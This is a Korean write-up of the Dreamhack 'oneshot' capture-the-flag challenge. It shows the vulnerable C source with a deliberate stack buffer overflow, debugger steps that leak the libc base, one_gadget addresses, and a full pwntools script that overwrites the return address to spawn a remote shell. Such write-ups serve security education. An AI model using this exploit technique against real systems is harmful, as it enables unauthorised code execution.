# oneshot - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name:Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 1
- Provided Files: oneshot.c, oneshot(ELF), libc.so.6
- tools:
## Brief Description
이 문제는 작동하고 있는 서비스(oneshot)의 바이너리와 소스코드가 주어집니다.
프로그램의 취약점을 찾고 셸을 획득한 후, "flag" 파일을 읽으세요.
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.
## Initial Analysis
### Environment
``` sh
checksec oneshot
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```
### Code
``` c
// gcc -o oneshot1 oneshot1.c -fno-stack-protector -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if(check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}
```
## Vulnerability
### BOF(Buffer Overflow)
``` c
read(0, msg, 46); // msg size = 16
```
`msg`의 크기는 16byte인 반면, `read`로 읽어오는 크기는 46byte로 30byte 벗어나 BOF 취약점이 발생한다. 
## Exploit
### Strategy
BOF 취약점을 이용했을 때, `msg`(rbp - 0x20)를 넘어서 덮을 수 있는 범위는 rbp의 8byte와 ra의 하위 6byte 밖에 없다. 이정도 크기로는 ROP chain을 구성하기 어렵다. 사용할 수 있는 one gadget들을 다 시도해보면 된다. x64 환경에서 8바이트 중 상위 2바이트는 커널 영역이다. 따라서 하위 6바이트만으로도 충분히 one gadget 주소로 덮을 수 있다.  
### Stack Frame of main
| Variable Name | Offset from RBP |
| --- | --- |
| ra | 0x8 |
| rbp |  |
| check | -0x8 |
| dummy | -0x10 |
| msg | -0x20 |
### Exploitation Steps
``` sh
pwndbg> break *(main+33)
pwndbg> ni
pwndbg> ni
```
``` sh
*RAX  0x7ffff7fa6868 (stdout) —▸ 0x7ffff7fa6780 (_IO_2_1_stdout_) ◂— 0xfbad2087
*RAX  0x7ffff7fa6780 (_IO_2_1_stdout_) ◂— 0xfbad2087
```
`stdout`이 가리키는 값은 libc의 `_IO_2_1_stdout_`임을 확인할 수 있다. 이 것으로 libc base를 구할 수 있다.  
``` sh
$ one_gadget x64/libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
해당 one_gadget들을 모두 시도해본다. libc에 존재하기 때문에 libc base와 더해서 사용해야 한다.  
### payload
``` python
from pwn import *

p = remote('host1.dreamhack.games', 18982)
context.arch = "amd64"

e = ELF('./oneshot')
libc = ELF('x64/libc.so.6')

# stdout
p.recvuntil(b'stdout: ')
stdout = int(p.recvline(), 16)

# libc base leak
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
log.info(f'libc base = {libc_base}')
og = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
og = og[0] + libc_base

# payload
payload = b''
payload += b'\x00' * 0x20 + b'A' * 0x8
payload += p64(og)[:8]

p.sendafter(b'MSG: ', payload)
p.recvline()

# interactive
p.interactive()
```
## Lessons Learned
### Libc Version
처음에 one_gadet을 사용할 때 다른 문제에서 제공해준 64bit libc.so.6을 사용했었는데, 해당 libc로는 풀리지 않았다. 이름이 같아서 같은 libc 파일인 줄 알았으나, `libc.so.6`은 glibc 라이브러리의 심볼릭 링크 이름으로, 실체는 `libc-<버전>.so`이다. 즉, glibc의 버전 차이, OS나 컴파일 옵션, 보안 패치 적용 여부 등 때문에 이름이 같아도 내용은 다를 수 있다. 또한 `libc-2.27.so` 처럼 버전 이름이 같아도 내용이 다를 수 있는데, 빌드 시 옵션이나 패치로 인해 함수 오프셋, gadget 위치 등이 달라질 수 있기 때문이다. 이걸 모르고 삽질하다가 혹시나 해서 문제에서 제공해준 libc로 one_gadget을 확인해보니 내용이 확연하게 다르다는 것을 알 수 있었다.  